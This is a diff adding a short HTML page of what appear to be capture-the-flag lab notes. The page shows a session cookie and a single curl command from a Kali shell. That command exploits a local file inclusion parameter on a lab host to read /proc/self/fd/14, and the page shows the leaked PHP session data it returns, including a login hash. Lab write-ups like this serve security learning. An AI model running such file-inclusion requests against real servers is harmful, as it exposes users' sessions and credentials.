@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>New Page</title>
+</head><body><img src="image.png" /><br/>
+<br/>
+<br/>
+<br/>
+<img src="image 13.png" /><br/>
+<br/>
+<br/>
+<br/>
+Set-Cookie: sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5; path=/; HttpOnly<br/>
+<br/>
+<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+<br/>
+root@kali:~# curl -s --cookie "sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5" http://192.168.2.102:33447/Challenge/include.php?file=$(php&nbsp;-r "echo urlencode('/proc/self/fd/14');") | sed&nbsp; '/&lt;html&gt;/,/*/d' | cut -d '&lt;' -f 1<br/>
+<br/>
+index_page|i:1440350358;user_id|s:1:"1";username|s:9:"test_user";login_string|s:128:"8cc28bf7a16672373346a20752ed5f7e5988d7ee63787ba06daeaa1e0cdbaa74c463ca52eb96ed6a2a4431b2c748671b7de162aa2da4d7e395791ad1d4d03d39";protected_page|i:1440350424;<br/>
+<br/>
+<br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+<img src="image 4.png" /></body></html>
